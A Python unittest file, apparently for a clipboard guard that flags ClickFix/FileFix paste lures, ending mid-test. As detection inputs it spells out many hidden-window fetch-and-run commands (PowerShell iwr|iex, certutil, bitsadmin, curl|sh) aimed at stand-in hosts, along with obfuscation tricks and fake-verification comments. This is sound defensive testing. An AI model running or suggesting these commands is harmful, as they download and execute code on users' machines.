"""The paste guard (ClickFix/FileFix): the classifier, and what the guard refuses.

The point of these tests is as much what the guard will not do as what it
catches: it never writes the clipboard, never keeps the text, never produces
a verdict, and never reads when it is told not to or when nothing changed.

Run with:  python -m unittest discover -s tests
"""

from __future__ import annotations

import io
import os as _os
import sys
import tempfile as _tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

_test_data = _os.path.join(_tempfile.gettempdir(), f"avguard-clip-data-{_os.getpid()}")
_os.environ.setdefault("AVGUARD_DATA", _test_data)
if _os.environ["AVGUARD_DATA"] == _test_data:
    import atexit as _atexit
    import shutil as _shutil
    _atexit.register(lambda: _shutil.rmtree(_test_data, ignore_errors=True))

from avguard import clipguard
from avguard.clipguard import FakeClipboard, Match, PasteGuard, WARNING, NOTICE
from avguard.events import EventStore

FIXTURES = Path(__file__).resolve().parent / "clipboard"
WARN_LINE = ('powershell -w hidden -c "iwr https://example.invalid/x | iex" '
             '# I am not a robot - reCAPTCHA Verification ID: 7731')


# --------------------------------------------------------------- classifier

class TestTheCorpus(unittest.TestCase):
    def test_every_must_warn_fixture_is_a_warning(self):
        files = sorted((FIXTURES / "must_warn").glob("*.txt"))
        self.assertGreaterEqual(len(files), 20, "the must_warn corpus shrank")
        signals = {}
        for path in files:
            with self.subTest(fixture=path.name):
                match = clipguard.classify(path.read_text(encoding="utf-8"))
                self.assertIsNotNone(match, f"{path.name} matched nothing")
                self.assertEqual(match.tier, WARNING,
                                 f"{path.name} is {match.tier}, not warning ({match.signals})")
                for s in match.signals:
                    signals[s] = signals.get(s, 0) + 1
        print("\n  paste-guard signals over must_warn:",
              ", ".join(f"{k} {v}" for k, v in sorted(signals.items())))

    def test_no_must_not_warn_fixture_is_a_warning(self):
        files = sorted((FIXTURES / "must_not_warn").glob("*.txt"))
        self.assertGreaterEqual(len(files), 25, "the must_not_warn corpus shrank")
        warnings, notices = [], []
        for path in files:
            with self.subTest(fixture=path.name):
                match = clipguard.classify(path.read_text(encoding="utf-8"))
                tier = match.tier if match else "none"
                if tier == WARNING:
                    warnings.append(path.name)
                elif tier == NOTICE:
                    notices.append(path.name)
                self.assertNotEqual(tier, WARNING, f"{path.name} warned: {match.signals if match else ''}")
        self.assertEqual(warnings, [], f"legitimate text warned: {warnings}")
        print(f"\n  paste-guard over must_not_warn: 0 warnings, {len(notices)} notice(s): "
              + ", ".join(notices))

    def test_a_launcherless_command_matches_nothing(self):
        for text in ("irm get.scoop.sh | iex", "iex (New-Object Net.WebClient).DownloadString('http://x/y')"):
            self.assertIsNone(clipguard.classify(text), text)

    def test_hidden_window_alone_is_not_a_warning(self):
        """ROADMAP Finding 1 applied again: the project's own install.bat shape."""
        m = clipguard.classify('powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File setup.ps1')
        self.assertIsNone(m)

    def test_a_local_hta_or_msi_is_not_remote(self):
        self.assertIsNone(clipguard.classify('mshta C:\\tools\\panel.hta'))
        self.assertIsNone(clipguard.classify('msiexec /i C:\\app.msi /qn'))

    def test_an_install_one_liner_is_a_notice_not_a_warning(self):
        m = clipguard.classify('powershell -c "irm https://astral.sh/uv/install.ps1 | iex"')
        self.assertIsNotNone(m)
        self.assertEqual(m.tier, NOTICE)

    def test_zero_width_and_carets_are_normalised_before_matching(self):
        zwsp = 'p\u200bo\u200bw\u200bershell -w hidden -c "iwr https://example.invalid/z|iex"'
        caret = 'p^o^w^e^r^s^h^e^l^l -w hidden -c "iwr https://example.invalid/k|iex"'
        for text in (zwsp, caret):
            m = clipguard.classify(text)
            self.assertIsNotNone(m, text)
            self.assertEqual(m.tier, WARNING)

    def test_a_padded_comment_is_the_filefix_shape(self):
        m = clipguard.classify('powershell -c "iwr https://example.invalid/f|iex"' + " " * 20 + "# open your document")
        self.assertEqual(m.tier, WARNING)
        self.assertIn("padded comment", m.signals)

    def test_text_over_the_cap_classifies_from_the_prefix_only(self):
        padding = " " * (clipguard.MAX_TEXT_CHARS + 10)
        self.assertIsNone(clipguard.classify(padding + WARN_LINE), "past the cap is not read")
        self.assertEqual(clipguard.classify(WARN_LINE + padding).tier, WARNING, "before it is")

    def test_the_match_names_the_host_and_launcher_and_no_text(self):
        import dataclasses
        m = clipguard.classify(WARN_LINE)
        self.assertEqual(m.host, "example.invalid")
        self.assertEqual(m.launcher, "powershell")
        self.assertEqual({f.name for f in dataclasses.fields(m)},
                         {"tier", "signals", "launcher", "host", "sha256", "chars"})


# ----------------------------------------------------------------- guard

class GuardCase(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(_tempfile.mkdtemp(prefix="avguard-clip-"))
        self.addCleanup(lambda: __import__("shutil").rmtree(self.tmp, ignore_errors=True))
        self.events = EventStore(path=self.tmp / "events.jsonl")
        self.seen: list[tuple[Match, clipguard.ClipText]] = []
        self.clip = FakeClipboard(text="", sequence=10)
        self.guard = PasteGuard(self.clip, self.events, notify=lambda m, c: self.seen.append((m, c)),
                                ignore_path=self.tmp / "clipboard_ignore.json")


class TestTheGuardReads(GuardCase):
    def test_an_unchanged_sequence_number_never_reads(self):
        for _ in range(100):
            self.guard.tick()
        self.assertEqual(self.clip.read_calls, 0)
        self.assertGreater(self.clip.sequence_calls, 0)

    def test_text_present_at_start_is_never_examined(self):
        self.clip.text = WARN_LINE          # already there, sequence unchanged since first tick
        self.guard.tick()                   # first tick only records the sequence
        self.assertEqual(self.clip.read_calls, 0)
        self.assertEqual(self.seen, [])

    def test_a_change_is_read_exactly_once(self):
        self.guard.tick()
        self.clip.put("hello world")
        self.guard.tick()
        self.guard.tick()
        self.assertEqual(self.clip.read_calls, 1)

    def test_a_warning_records_an_event_and_calls_notify(self):
        self.guard.tick()
        self.clip.put(WARN_LINE, owner="msedge.exe")
        match = self.guard.tick()
        self.assertEqual(match.tier, WARNING)
        self.assertEqual(len(self.seen), 1)
        events = self.events.read(kinds={"clipboard"})
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].level, WARNING)
        self.assertIn("msedge.exe", events[0].reasons[0])
        self.assertEqual(events[0].detail["host"], "example.invalid")
        self.assertEqual(events[0].detail["owner"], "msedge.exe")

    def test_a_notice_records_an_event(self):
        self.guard.tick()
        self.clip.put('powershell -c "irm https://astral.sh/uv/install.ps1 | iex"')
        match = self.guard.tick()
        self.assertEqual(match.tier, NOTICE)
        self.assertEqual(self.events.read(kinds={"clipboard"})[0].level, NOTICE)

    def test_the_event_carries_no_clipboard_text(self):
        self.guard.tick()
        self.clip.put(WARN_LINE)
        self.guard.tick()
        line = (self.tmp / "events.jsonl").read_text(encoding="utf-8")
        self.assertNotIn("example.invalid/x", line)
        self.assertNotIn("iwr https", line)
        self.assertNotIn("reCAPTCHA", line)

    def test_an_unknown_owner_is_said_to_be_unknown(self):
        self.guard.tick()
        self.clip.put(WARN_LINE, owner=None)
        self.guard.tick()
        event = self.events.read(kinds={"clipboard"})[0]
        self.assertIn("could not be identified", event.reasons[0])
        self.assertEqual(event.detail["owner"], "")
        self.assertIsNone(self.seen[0][1].owner)

    def test_the_event_detail_is_exactly_the_shape_the_host_and_the_program(self):
        self.guard.tick()
        self.clip.put(WARN_LINE, owner="msedge.exe")
        self.guard.tick()
        detail = self.events.read(kinds={"clipboard"})[0].detail
        self.assertEqual(set(detail), {"signals", "launcher", "host", "owner"})

    def test_a_clipboard_event_is_never_forwarded(self):
        """Whatever forwarding URL is set, 'sends nothing' holds."""
        sent: list[dict] = []
        events = EventStore(path=self.tmp / "fwd.jsonl",
                            forwarder=type("Fwd", (), {"submit": lambda self, payload: sent.append(payload)})())
        guard = PasteGuard(self.clip, events, ignore_path=self.tmp / "fwd_ignore.json")
        guard.tick()
        self.clip.put(WARN_LINE)
        self.assertEqual(guard.tick().tier, WARNING)
        self.assertEqual(len(events.read(kinds={"clipboard"})), 1, "recorded for History")
        self.assertEqual(sent, [], "and never handed to the forwarder")
        from avguard.events import Event
        events.record(Event(kind="detection", path="x", level="malicious", score=90, reasons=[]))
        self.assertEqual(len(sent), 1, "the forwarder itself works; the exception is the clipboard")


class TestTheGuardRefuses(GuardCase):
    def test_an_excluded_format_is_not_read(self):
        self.guard.tick()
        self.clip.excluded = True
        self.clip.put("anything a password manager wrote", owner="keepass.exe")
        self.guard.tick()
        self.assertEqual(self.guard.counters.texts_read, 0)
        self.assertEqual(self.guard.counters.skipped_excluded, 1)
        self.assertEqual(self.seen, [])

    def test_non_text_content_is_not_classified(self):
        self.guard.tick()
        self.clip.is_text = False
        self.clip.sequence_value += 1
        self.guard.tick()
        self.assertEqual(self.guard.counters.skipped_not_text, 1)

    def test_text_over_the_cap_is_skipped_and_counted(self):
        self.guard.tick()
        self.clip.text = "x" * (clipguard.MAX_TEXT_CHARS + 1)
        self.clip.sequence_value += 1
        self.guard.tick()
        self.assertEqual(self.guard.counters.skipped_too_long, 1)
        self.assertEqual(self.seen, [])

    def test_an_ignored_text_is_silent_and_a_changed_byte_is_not(self):
        self.guard.tick()
        self.clip.put(WARN_LINE)
        match = self.guard.tick()
        self.guard.ignore(match)
        self.clip.put(WARN_LINE)
        self.assertIsNone(self.guard.tick(), "the ignored text warns no more")
        self.assertEqual(self.guard.counters.ignored, 1)
        self.clip.put(WARN_LINE.replace("/x", "/y"))      # a different command, not just whitespace
        self.assertIsNotNone(self.guard.tick(), "a changed text is not ignored")

    def test_the_ignore_file_lives_under_the_given_path_and_survives_reload(self):
        self.guard.tick()
        self.clip.put(WARN_LINE)
        self.guard.ignore(self.guard.tick())
        self.assertTrue((self.tmp / "clipboard_ignore.json").is_file())
        fresh = PasteGuard(FakeClipboard(), self.events, ignore_path=self.tmp / "clipboard_ignore.json")
        self.assertEqual(len(fresh.ignored()), 1)

    def test_a_corrupt_ignore_file_is_treated_as_empty(self):
        (self.tmp / "clipboard_ignore.json").write_text("{not json", encoding="utf-8")
        self.assertEqual(self.guard.ignored(), set())

    def test_a_held_clipboard_is_retried_and_counted(self):
        self.guard.tick()
        self.clip.put(WARN_LINE)
        self.clip.busy = True
        self.assertIsNone(self.guard.tick())
        self.assertIsNone(self.guard.tick())
        self.assertEqual(self.guard.counters.read_failures, 2)
        self.clip.busy = False
        self.assertIsNotNone(self.guard.tick(), "the same change is retried once free")

    def test_health_is_red_only_after_a_streak_and_one_good_read_clears_it(self):
        self.guard.tick()
        self.clip.busy = True
        for _ in range(clipguard.HEALTH_FAILURE_STREAK - 1):
            self.clip.sequence_value += 1
            self.guard.tick()
        self.assertTrue(self.guard.healthy, "one short of the streak is still green")
        self.clip.sequence_value += 1
        self.guard.tick()
        self.assertFalse(self.guard.healthy)
        self.assertIn("could not be read for", self.guard.describe())
        self.clip.busy = False
        self.guard.tick()
        self.assertTrue(self.guard.healthy)
        self.assertEqual(self.guard.counters.consecutive_failures, 0)

    def test_an_error_that_is_not_busy_is_counted_logged_once_and_not_retried(self):
        self.guard.tick()
        self.clip.read = mock.Mock(side_effect=OSError("the binding is wrong"))
        with self.assertLogs("avguard.clipguard", level="DEBUG") as logged:
            for _ in range(3):
                self.clip.put(WARN_LINE)
                self.guard.tick()
        self.assertEqual(self.guard.counters.read_failures, 3)
        self.assertEqual(self.guard.counters.consecutive_failures, 3)
        self.assertIn("OSError: the binding is wrong", self.guard.counters.last_error)
        self.assertEqual(sum(r.levelname == "ERROR" for r in logged.records), 1, "one traceback per streak")
        self.assertEqual(self.clip.read.call_count, 3, "a failed change is not retried every tick")

    def test_text_copied_while_the_guard_was_off_is_never_read(self):
        """The GUI calls disarm() on every tick the guard is off; what was
        copied in between is not examined when it comes back."""
        self.guard.tick()
        self.guard.disarm()
        self.clip.put(WARN_LINE)            # copied while off
        self.assertIsNone(self.guard.tick(), "the first tick back only records the sequence")
        self.assertEqual(self.clip.read_calls, 0)
        self.clip.put(WARN_LINE)            # copied after it came back
        self.assertIsNotNone(self.guard.tick())

    def test_a_zero_sequence_is_said_not_red_and_the_first_change_after_it_is_read(self):
        """0 is a window station before its first copy as much as it is no
        access, so Health says both; the copy that moves it to 1 is examined."""
        clip = FakeClipboard(sequence=0)
        zero = PasteGuard(clip, self.events, ignore_path=self.tmp / "zero_ignore.json")
        self.assertIsNone(zero.tick())
        self.assertTrue(zero.healthy)
        self.assertIn("sequence number is 0", zero.describe())
        self.assertIn("may not read", zero.describe())
        clip.put(WARN_LINE)                                   # 0 -> 1
        self.assertIsNotNone(zero.tick(), "the first copy after sign-in is examined")
        self.assertNotIn("sequence number is 0", zero.describe())

    def test_the_event_carries_no_hash_of_the_text(self):
        """A hash of a short command is a lookup away from the command, and
        events can be forwarded. The hash lives in the ignore file only."""
        self.guard.tick()
        self.clip.put(WARN_LINE)
        match = self.guard.tick()
        event = self.events.read(kinds={"clipboard"})[0]
        self.assertNotIn("sha256", event.detail)
        self.assertNotIn(match.sha256, (self.tmp / "events.jsonl").read_text(encoding="utf-8"))

    def test_describe_says_nothing_leaves_this_machine(self):
        self.guard.tick()
        self.clip.put(WARN_LINE)
        self.guard.tick()
        self.assertIn("nothing is kept and nothing leaves this machine", self.guard.describe())

    def test_a_disabled_source_is_never_touched(self):
        off = FakeClipboard()
        off.available = False
        guard = PasteGuard(off, self.events)
        for _ in range(10):
            guard.tick()
        self.assertEqual((off.sequence_calls, off.read_calls), (0, 0))


EXPECTED_SIGNAL = {
    "bitsadmin-transfer.txt": "program dropped in a temporary folder",
    "bitsadmin-share-by-name.txt": "program dropped in a temporary folder",
    "bidi-in-iex.txt": "fake-verification comment",
    "caret-insertion.txt": "hidden window",
    "certutil-urlcache.txt": "program dropped in a temporary folder",
    "charcode-obfuscation.txt": "obfuscated",
    "conhost-headless.txt": "hidden window",
    "conhost-headless-only.txt": "hidden window",
    "drop-and-run-appdata.txt": "program dropped in a temporary folder",
    "drop-and-run-by-name.txt": "program dropped in a temporary folder",
    "encoded-command.txt": "encoded command",
    "filefix-padded-comment.txt": "padded comment",
    "frombase64.txt": "encoded command",
    "hidden-fetch-iex.txt": "hidden window",
    "instructions-then-command.txt": "hidden window",
    "lure-checkmark.txt": "fake-verification comment",
    "lure-checkmark-no-hidden.txt": "fake-verification comment",
    "lure-cloudflare-ray.txt": "fake-verification comment",
    "lure-robot-tail.txt": "fake-verification comment",
    "ms-appinstaller.txt": "protocol handler to a remote location",
    "mshta-inline-javascript.txt": "inline mshta script",
    "mshta-inline-vbscript.txt": "inline mshta script",
    "mshta-remote-hta.txt": "remote HTML application",
    "msiexec-remote.txt": "remote installer package",
    "multiline-batch.txt": "hidden window",
    "obfuscation-join.txt": "obfuscated",
    "regsvr32-scrobj.txt": "remote library through regsvr32",
    "rundll32-remote.txt": "remote library through rundll32",
    "search-ms-bare-uri.txt": "protocol handler to a remote location",
    "search-ms-protocol.txt": "script from a share at an address",
    "webdav-unc-wscript.txt": "script from a share at an address",
    "window-prefix-hid.txt": "hidden window",
    "zero-width-powershell.txt": "hidden window",
    "lure-thai-robot-tail.txt": "fake-verification comment",
    "lure-thai-recaptcha-label.txt": "fake-verification comment",
    "lure-thai-not-a-bot.txt": "fake-verification comment",
    "lure-thai-human-sara-am.txt": "fake-verification comment",
    "lure-thai-human-sara-am-decomposed.txt": "fake-verification comment",
    "lure-thai-unusual-traffic.txt": "fake-verification comment",
    "lure-thai-connection-check.txt": "fake-verification comment",
}
ALL_SIGNALS = {
    "encoded command", "inline mshta script", "remote HTML application", "remote installer package",
    "remote library through rundll32", "remote library through regsvr32", "script from a share at an address",
    "hidden window", "program dropped in a temporary folder", "protocol handler to a remote location",
    "fake-verification comment", "padded comment", "obfuscated",
}


class TestEveryFixtureProvesItsSignal(unittest.TestCase):
    """A fixture named for a signal used to prove only that it warned, and
    most warned through "-w hidden" alone: a review deleted nine detector
    pieces with the corpus still green. Now each fixture claims a signal."""

    def test_each_must_warn_fixture_fires_the_signal_it_is_named_for(self):
        names = sorted(p.name for p in (FIXTURES / "must_warn").glob("*.txt"))
        self.assertEqual(names, sorted(EXPECTED_SIGNAL), "every fixture is in the manifest and vice versa")
        for name in names:
            match = clipguard.classify((FIXTURES / "must_warn" / name).read_text(encoding="utf-8"))
            with self.subTest(fixture=name):
                self.assertIn(EXPECTED_SIGNAL[name], match.signals)

    def test_every_signal_the_classifier_can_emit_has_a_fixture(self):
        source = Path(clipguard.__file__).read_text(encoding="utf-8")
        for signal in ALL_SIGNALS:
            self.assertIn(f'"{signal}"' if "through " not in signal else '"remote library through "', source)
        self.assertEqual(set(EXPECTED_SIGNAL.values()), ALL_SIGNALS)

    def test_the_fetch_verbs_the_bare_host_and_the_self_running_launchers_each_carry_a_notice(self):
        verb_only = clipguard.classify('powershell -c "iwr $u | iex"')
        self.assertEqual((verb_only.tier, verb_only.host), (NOTICE, ""), "_FETCH alone")
        bare = clipguard.classify('powershell -c "irm bun.sh/install.ps1 | iex"')
        self.assertEqual((bare.tier, bare.host), (NOTICE, "bun.sh"), "_BARE_HOST alone (a host with a path)")
        self.assertEqual(clipguard.classify("wscript https://example.invalid/x.js").tier, NOTICE,
                         "_RUNS_WHAT_IT_FETCHES alone")


class TestWhatTheSecondReadingFound(unittest.TestCase):
    """A second, adversarial reading of the classifier. Each case here was
    reproduced against the shipped code before it was fixed; the fixtures
    added with them are in tests/clipboard."""

    def test_the_dressing_needs_a_command_that_fetches_and_runs(self):
        for text in ('curl -I https://example.com # verify the server is up',
                     'curl -s https://example.com/health \u2705',
                     'cmd /c echo hello               # aligned comment',
                     'powershell -c "1 -bxor 2"'):
            self.assertIsNone(clipguard.classify(text), text)
        dressed = clipguard.classify('cmd /c "curl -s https://example.invalid/x -o %TEMP%\\x.exe '
                                     '& %TEMP%\\x.exe" # verify you are human')
        self.assertEqual(dressed.tier, WARNING)
        self.assertIn("fake-verification comment", dressed.signals)

    def test_a_lure_comment_names_the_lure_not_any_verification(self):
        self.assertIsNone(clipguard.classify('curl https://example.com/sum.txt # verify the checksum'))
        for tail in ("# verify you are human", "# Verification ID: 12", "# not a robot", "# press enter"):
            match = clipguard.classify(f'powershell -c "iwr https://example.invalid/x | iex" {tail}')
            self.assertEqual(match.tier, WARNING, tail)

    def test_each_thai_phrase_counts_on_its_own_and_the_words_it_was_built_against_do_not(self):
        """Thai writes no spaces between words, so each alternative is a
        substring: the phrase must fire alone, and the bare words that honest
        Thai developer comments use must not."""
        line = 'powershell -c "iwr https://example.invalid/x | iex" # '
        for phrase in clipguard._THAI_LURE_PHRASES:
            for joiner in ("", " ", "\u200b"):
                tail = joiner.join(phrase)
                with self.subTest(tail=tail):
                    self.assertEqual(clipguard.classify(line + tail).tier, WARNING)
        for honest in ("ยืนยัน", "ตรวจสอบ", "หุ่นยนต์", "บอท", "แชทบอท", "มนุษย์", "อ่านได้โดยมนุษย์",
                       "โปรแกรมอัตโนมัติ", "เปิดโปรแกรมอัตโนมัติ", "ยืนยันตัวตน", "สําเร็จ", "ส\u0e33เร็จ",
                       "กด Enter", "ตรวจสอบความปลอดภัย", "ความปลอดภัย", "ยืนยันว่าเซิร์ฟเวอร์ขึ้นแล้ว",
                       "ขั้นตอนการยืนยัน", "การยืนยันส\u0e33เร็จ", "แคปช่า"):
            with self.subTest(honest=honest):
                self.assertEqual(clipguard.classify(line + honest).tier, NOTICE,
                                 "a fetch-and-run line stays a notice under an honest Thai comment")

    def test_the_thai_alternatives_are_in_the_form_normalize_leaves_text_in(self):
        """NFKC splits SARA AM (U+0E33) into NIKHAHIT + SARA AA. A pattern
        literal typed with it would never match normalized text; the helper
        folds the pattern the same way, so a phrase with sara am matches both
        spellings, and the compiled rule holds no U+0E33 to drift back in."""
        import re
        import unicodedata
        self.assertNotIn("\u0e33", clipguard._LURE_COMMENT.pattern)
        for phrase in clipguard._THAI_LURE_PHRASES:
            for part in phrase:
                self.assertEqual(part, unicodedata.normalize("NFKC", part), part)
        folded = re.compile(clipguard._thai_alternatives([("ก\u0e33", "ลัง")]))
        for spelling in ("ก\u0e33ลัง", "ก\u0e4d\u0e32ลัง"):
            self.assertIsNotNone(folded.search(clipguard.normalize(spelling)), ascii(spelling))
        self.assertIsNone(re.compile("ก\u0e33ลัง").search(clipguard.normalize("ก\u0e33ลัง")),
                          "the trap the helper exists for")

    def test_a_thai_comment_alone_is_not_a_warning(self):
        """The comment rule is a dressing, as in English: it counts only on a
        command that already fetches and runs."""
        self.assertIsNone(clipguard.classify("echo hello # ฉันไม่ใช่หุ่นยนต์"))
        self.assertIsNone(clipguard.classify("curl -I https://example.com # ยืนยันว่าคุณเป็นมนุษย์"))

    def test_a_launcher_inside_a_url_is_a_path(self):
        self.assertIsNone(clipguard.classify(
            'see https://github.com/PowerShell/PowerShell and start the installer'))
        self.assertIsNone(clipguard.classify('open https://example.com/search?q=cmd and start reading'))
        after = clipguard.classify('echo https://example.invalid/x&powershell -c "iwr https://example.invalid/x|iex"')
        self.assertEqual(after.launcher, "powershell", "the same word after a URL ends is a program")

    def test_a_protocol_handler_in_prose_is_not_a_launcher(self):
        self.assertIsNone(clipguard.classify(
            'the search-ms: handler is described at https://example.com/docs'))
        self.assertEqual(clipguard.classify(
            'start ms-appinstaller:?source=https://example.invalid/app.msix').tier, WARNING)

    def test_the_host_cannot_be_spoofed_or_stretched(self):
        for lure in ('powershell -w hidden -c "iwr https://evil.invalid#@example.com/x | iex"',
                     'powershell -w hidden -c "iwr https://evil.invalid?@example.com/x | iex"'):
            self.assertEqual(clipguard.classify(lure).host, "evil.invalid", lure)
        self.assertEqual(clipguard.classify('powershell -c "iwr https://example.com@evil.invalid/x | iex"').host,
                         "evil.invalid", "a user part is cut away")
        long = clipguard.classify('powershell -w hidden -c "iwr https://' + "a" * 3000 + '/x | iex"')
        self.assertEqual((long.tier, long.host), (WARNING, ""), "not a host name; still remote")

    def test_the_host_stops_where_a_host_name_cannot_continue(self):
        self.assertEqual(clipguard.classify('powershell -c "iwr https://a|iex"').host, "a")
        self.assertEqual(clipguard.classify('powershell -c "iwr https://example.invalid;iex"').host,
                         "example.invalid")
        self.assertEqual(clipguard.classify('powershell -c "iwr https://u:p@example.invalid:8443/x|iex"').host,
                         "example.invalid")

    def test_this_machine_is_not_a_remote_location(self):
        for text in ('powershell -c "iwr http://localhost:8000/x | iex"', 'curl http://127.0.0.1:8000/run | sh'):
            match = clipguard.classify(text)
            self.assertEqual((match.tier, match.host), (NOTICE, ""), text)

    def test_the_sentences_read_as_english(self):
        console = clipguard.classify('conhost --headless powershell -c "iwr https://example.invalid/x | iex"')
        self.assertIn("start a console in a hidden window and run code it downloads from example.invalid",
                      console.does())
        notice = clipguard.classify('cmd /c "curl -s https://example.invalid/setup.bat -o s.bat && call s.bat"')
        self.assertEqual(notice.tier, NOTICE)
        self.assertIn("a command that starts the command prompt and downloads", notice.sentence(None))
        self.assertNotIn("a the", notice.sentence(None))
        no_host = clipguard.classify('powershell -c "iwr http://localhost/x | iex"')
        self.assertIn("downloads and runs code; it was copied from chrome.exe", no_host.sentence("chrome.exe"))
        hidden_no_host = clipguard.classify('powershell -w hidden -c "iwr $u | iex"')
        self.assertEqual(hidden_no_host.does(), "start PowerShell in a hidden window and run code it downloads")

    def test_bitsadmin_transfer_counts_as_a_fetch_without_a_url(self):
        match = clipguard.classify(r'bitsadmin /transfer j \\fileserver\share\t.exe %TEMP%\t.exe & start %TEMP%\t.exe')
        self.assertEqual(match.tier, WARNING)
        self.assertIn("program dropped in a temporary folder", match.signals)

    def test_start_dash_cmdlets_run_nothing(self):
        for text in ('powershell -c "Start-Service w3svc; iwr https://example.invalid/health"',
                     'powershell -c "Start-Sleep 5; curl https://example.invalid/ping"'):
            self.assertIsNone(clipguard.classify(text), text)

    def test_any_prefix_of_windowstyle_hidden_is_hidden(self):
        for flag in ("-w hid", "-win hid", "-window hidden", "-windowst h", "-WindowStyle Hidden", "-w 1"):
            match = clipguard.classify(f'powershell {flag} -c "iwr https://example.invalid/x | iex"')
            self.assertIn("hidden window", match.signals, flag)
        waited = clipguard.classify('powershell -wait -c "iwr https://example.invalid/x | iex"')
        self.assertNotIn("hidden window", waited.signals)

    def test_every_format_character_is_stripped_not_only_the_zero_width_ones(self):
        for invisible in ("\U000E0041", "\u202a", "\u2066", "\u00ad", "\ufeff"):
            match = clipguard.classify(
                f'powershell -c "iwr https://example.invalid/x | i{invisible}ex" # I am not a robot')
            self.assertIsNotNone(match, repr(invisible))
            self.assertEqual(match.tier, WARNING, repr(invisible))
        self.assertEqual(clipguard.normalize("a\u200bb\U000E0041c"), "abc")

    def test_a_lone_surrogate_is_classified_not_a_crash(self):
        match = clipguard.classify('powershell -c "iwr https://example.invalid/x | iex" \ud800')
        self.assertEqual(match.tier, NOTICE)
        self.assertEqual(len(match.sha256), 64)
        self.assertEqual(match.host, "example.invalid")

    def test_a_lure_comment_must_share_a_line_with_its_words(self):
        apart = clipguard.classify('curl -s https://example.invalid/x | sh\n# setup\necho not a robot')
        self.assertEqual(apart.tier, NOTICE)
        together = clipguard.classify('curl -s https://example.invalid/x | sh # not a robot')
        self.assertEqual(together.tier, WARNING)

    def test_a_command_on_its_own_line_is_in_command_position(self):
        self.assertEqual(clipguard.classify(
            '@echo off\npowershell -w hidden -c "iwr https://example.invalid/x | iex"').tier, WARNING)
        self.assertEqual(clipguard.classify(
            'Press Win+R and paste:\npowershell -c "irm https://example.invalid/x | iex"').tier, NOTICE)
        self.assertIsNone(clipguard.classify('PowerShell is a shell.\nIt is documented at https://example.com/docs.'))

    def test_a_program_file_after_a_separator_is_run(self):
        match = clipguard.classify(
            'certutil -urlcache -f https://example.invalid/a.exe a.exe & a.exe # verify you are human')
        self.assertEqual(match.tier, WARNING)
        self.assertIsNone(clipguard.classify('powershell -c "irm https://win.rustup.rs/x86_64 -OutFile rustup-init.exe"'),
                          "a file merely saved is not run")


class TestTheReaderThroughAFakeUser32(unittest.TestCase):
    """read() on any platform: the ctypes objects are stand-ins with the real
    names, the string buffer is real memory, and what matters is the order of
    the calls and what is never called."""

    def make(self, text="hello", formats=(), hung=False, open_ok=True, text_available=True,
             size_chars=None):
        import ctypes
        import types
        clip = clipguard.WindowsClipboard.__new__(clipguard.WindowsClipboard)
        clip._exclusion_formats = (49001, 49002)
        clip._wt = types.SimpleNamespace(DWORD=ctypes.c_uint32)
        # UTF-16-LE bytes with a NUL and garbage after it, as a real block holds them.
        raw = text.encode("utf-16-le", "surrogatepass") + b"\0\0" + "garbage".encode("utf-16-le")
        buffer = ctypes.create_string_buffer(raw, len(raw))
        calls: list[str] = []
        reported = size_chars if size_chars is not None else len(raw) // 2

        class User32:
            def OpenClipboard(self, hwnd): calls.append("open"); return 1 if open_ok else 0
            def CloseClipboard(self): calls.append("close"); return 1
            def GetClipboardOwner(self): return 0x1234
            def IsClipboardFormatAvailable(self, fmt):
                return fmt in formats or (fmt == clipguard.CF_UNICODETEXT and text_available)
            def IsHungAppWindow(self, hwnd): calls.append("hung?"); return hung
            def GetClipboardData(self, fmt): calls.append("data"); return 77
            def GetWindowThreadProcessId(self, hwnd, pid): return 0      # pid stays 0: owner unknown

        class Kernel32:
            def GlobalSize(self, handle): return reported * 2            # bytes, as Windows reports UTF-16
            def GlobalLock(self, handle): calls.append("lock"); return ctypes.addressof(buffer)
            def GlobalUnlock(self, handle): calls.append("unlock"); return 1

        clip._user32, clip._kernel32 = User32(), Kernel32()
        self.keep = buffer
        return clip, calls

    def test_text_is_read_to_the_nul_and_the_block_unlocked_and_closed(self):
        clip, calls = self.make("hello \u2713")
        got = clip.read()
        self.assertEqual((got.text, got.chars, got.owner), ("hello \u2713", 7, None))
        self.assertEqual(calls, ["open", "hung?", "data", "lock", "unlock", "close"])

    def test_half_a_surrogate_pair_is_replaced_at_the_read(self):
        clip, _ = self.make("x \ud800 y")
        self.assertEqual(clip.read().text, "x \ufffd y")

    def test_a_privacy_format_stops_the_read_before_the_data_is_touched(self):
        clip, calls = self.make(formats=(49002,))
        self.assertTrue(clip.read().excluded)
        self.assertNotIn("data", calls)
        self.assertEqual(calls[-1], "close")

    def test_non_text_is_none_without_touching_the_data(self):
        clip, calls = self.make(text_available=False)
        self.assertIsNone(clip.read())
        self.assertNotIn("data", calls)

    def test_a_hung_owner_is_busy_not_a_blocked_thread(self):
        clip, calls = self.make(hung=True)
        with self.assertRaises(clipguard.ClipboardBusy):
            clip.read()
        self.assertNotIn("data", calls)
        self.assertEqual(calls[-1], "close")

    def test_a_clipboard_that_will_not_open_is_busy_and_not_closed(self):
        clip, calls = self.make(open_ok=False)
        with self.assertRaises(clipguard.ClipboardBusy):
            clip.read()
        self.assertEqual(calls, ["open"])

    def test_text_over_the_cap_is_measured_not_locked(self):
        clip, calls = self.make(size_chars=clipguard.MAX_TEXT_CHARS + 1)
        got = clip.read()
        self.assertTrue(got.truncated)
        self.assertEqual(got.chars, clipguard.MAX_TEXT_CHARS + 1)
        self.assertNotIn("lock", calls)

    def test_a_privacy_format_that_cannot_be_registered_turns_the_guard_off(self):
        import types
        clip = clipguard.WindowsClipboard.__new__(clipguard.WindowsClipboard)
        clip.available = True
        clip._user32 = types.SimpleNamespace(RegisterClipboardFormatW=lambda name: 0 if "Ignore" in name else 49002)
        with self.assertLogs("avguard.clipguard", level="ERROR"):
            clip._register_exclusion_formats()
        self.assertFalse(clip.available)
        self.assertIn("privacy formats could not be registered", clip.unavailable_reason)
        fine = clipguard.WindowsClipboard.__new__(clipguard.WindowsClipboard)
        fine.available = True
        fine._user32 = types.SimpleNamespace(RegisterClipboardFormatW=lambda name: 49001 + ("Ignore" not in name))
        fine._register_exclusion_formats()
        self.assertTrue(fine.available)
        self.assertEqual(fine._exclusion_formats, (49001, 49002))


class TestTheModuleNeverWritesTheClipboard(unittest.TestCase):
    def test_the_source_names_no_write_calls(self):
        source = Path(clipguard.__file__).read_text(encoding="utf-8")
